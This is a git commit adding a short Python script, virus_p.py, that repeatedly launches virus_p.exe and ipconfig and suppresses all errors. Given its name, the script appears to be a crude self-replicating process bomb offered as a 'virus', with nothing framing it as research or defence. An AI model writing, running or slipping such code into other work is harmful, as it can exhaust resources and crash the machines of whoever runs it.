31a69ff592335ad160e6538c748b13790631365c
saurabhwadekar <55120484+saurabhwadekar@users.noreply.github.com>
2019-12-13 10:22:56 +0700

    Add files via upload

---
+++ virus_p.py
@@ -0,0 +1,13 @@
+import subprocess
+
+try:
+    subprocess.Popen("virus_p.exe")
+    subprocess.Popen("virus_p.exe")
+    subprocess.Popen("virus_p.exe")
+    subprocess.Popen("ipconfig")
+    subprocess.Popen("ipconfig")
+    subprocess.Popen("ipconfig")
+    subprocess.Popen("ipconfig")
+except:
+    pass
+
